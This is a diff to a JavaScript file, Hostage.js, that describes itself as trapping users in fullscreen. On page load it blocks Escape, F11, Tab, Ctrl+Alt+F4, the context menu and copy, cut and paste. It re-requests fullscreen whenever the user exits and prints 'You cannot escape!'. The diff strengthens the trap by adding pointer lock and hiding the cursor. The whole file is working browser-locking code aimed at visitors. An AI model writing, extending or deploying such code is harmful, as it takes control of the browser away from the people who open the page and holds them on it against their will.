@@ -1,27 +1,30 @@
-//Hostage.js - A script to trap users in fullscreen mode and prevent certain actions
+// Hostage.js - A script to keep the page in fullscreen and pointer lock.
 
-let Delivered = false;
+let delivered = false;
 let mutationSyncScheduled = false;
+
+const blockedCombinations = [
+  { key: "F11", keyCode: 122, ctrl: false, alt: false, shift: false },
+  { key: "Escape", keyCode: 27, ctrl: false, alt: false, shift: false },
+  { key: "Tab", keyCode: 9, ctrl: false, alt: false, shift: false },
+  { key: "F4", keyCode: 115, ctrl: true, alt: true, shift: false },
+];
+
+function warnBlockedAction() {
+  console.warn("Na Uh");
+}
 
 function onContextMenu(event) {
   event.preventDefault();
-  console.warn("Na Uh");
+  warnBlockedAction();
 }
 
 function onClipboardEvent(event) {
   event.preventDefault();
-  console.warn("Na Uh");
+  warnBlockedAction();
 }
 
 function keyboardEventHandler(event) {
-  // List of key combinations to block
-  const blockedCombinations = [
-    { key: "F11", keyCode: 122, ctrl: false, alt: false, shift: false },
-    { key: "Escape", keyCode: 27, ctrl: false, alt: false, shift: false },
-    { key: "Tab", keyCode: 9, ctrl: false, alt: false, shift: false },
-    { key: "F4", keyCode: 115, ctrl: true, alt: true, shift: false },
-  ];
-
   for (const combination of blockedCombinations) {
     if (
       (event.key === combination.key || event.keyCode === combination.keyCode) &&
@@ -30,30 +33,68 @@ function keyboardEventHandler(event) {
       event.shiftKey === combination.shift
     ) {
       event.preventDefault();
-      console.warn("Na Uh");
+      warnBlockedAction();
       break;
     }
   }
 }
 
+function setCursorLocked(locked) {
+  document.documentElement.style.cursor = locked ? "none" : "";
+  if (document.body) {
+    document.body.style.cursor = locked ? "none" : "";
+  }
+}
+
+function requestFullscreenBestEffort() {
+  if (!document.fullscreenEnabled || document.fullscreenElement) {
+    return;
+  }
+
+  document.documentElement.requestFullscreen().catch((err) => {
+    console.error("Failed to enter fullscreen mode:", err);
+  });
+}
+
+function requestPointerLockBestEffort() {
+  const target = document.body || document.documentElement;
+
+  if (!target || typeof target.requestPointerLock !== "function") {
+    console.warn("Pointer Lock API is not supported by this browser.");
+    return;
+  }
+
+  try {
+    target.requestPointerLock();
+  } catch (err) {
+    console.error("Failed to request pointer lock:", err);
+  }
+}
+
+function syncPointerLockState() {
+  setCursorLocked(Boolean(document.pointerLockElement));
+
+  if (delivered && document.fullscreenElement && !document.pointerLockElement) {
+    requestPointerLockBestEffort();
+  }
+}
+
 function onFullscreenChange() {
   if (!document.fullscreenElement) {
-    try {
-      document.documentElement.requestFullscreen();
-      console.warn("Na Uh");
-    } catch (err) {
-      console.error("Failed to trap user in fullscreen mode:", err);
-    }
+    requestFullscreenBestEffort();
   } else {
     console.log("Welcome to the full screen experience!");
+    syncPointerLockState();
   }
 }
 
 function Escape() {
-  if (Delivered === false) {
-    Delivered = true;
+  if (!delivered) {
+    delivered = true;
     document.body.append(document.createTextNode("You cannot escape!"));
-    document.documentElement.requestFullscreen();
+    setCursorLocked(true);
+    requestFullscreenBestEffort();
+    requestPointerLockBestEffort();
   }
 }
 
@@ -62,13 +103,17 @@ function bindHostageHandlers() {
   document.removeEventListener("copy", onClipboardEvent);
   document.removeEventListener("paste", onClipboardEvent);
   document.removeEventListener("cut", onClipboardEvent);
+  document.removeEventListener("keydown", keyboardEventHandler);
   document.removeEventListener("fullscreenchange", onFullscreenChange);
+  document.removeEventListener("pointerlockchange", syncPointerLockState);
 
   document.addEventListener("contextmenu", onContextMenu);
   document.addEventListener("copy", onClipboardEvent);
   document.addEventListener("paste", onClipboardEvent);
   document.addEventListener("cut", onClipboardEvent);
+  document.addEventListener("keydown", keyboardEventHandler);
   document.addEventListener("fullscreenchange", onFullscreenChange);
+  document.addEventListener("pointerlockchange", syncPointerLockState);
 }
 
 function syncEscapeButton() {
@@ -90,7 +135,7 @@ function syncHostagePage() {
 function logUnexpectedMutations(mutations) {
   const details = mutations.map((mutation) => ({
     type: mutation.type,
-    target: mutation.target && mutation.target.nodeName,
+    target: mutation.target?.nodeName,
     addedNodes: mutation.addedNodes.length,
     removedNodes: mutation.removedNodes.length,
     attributeName: mutation.attributeName,
@@ -112,13 +157,7 @@ function scheduleHostageResync() {
 }
 
 function hostage() {
-  if (document.fullscreenEnabled) {
-    document.documentElement.requestFullscreen().catch((err) => {
-      console.error("Failed to enter fullscreen mode:", err);
-    });
-  } else {
-    console.warn("Fullscreen mode is not supported by this browser.");
-  }
+  requestFullscreenBestEffort();
 
   syncHostagePage();
 
@@ -277,5 +316,5 @@ function hostage() {
     attributes: true,
   });
 }
-//run the function when the page loads
+
 window.addEventListener("load", hostage);
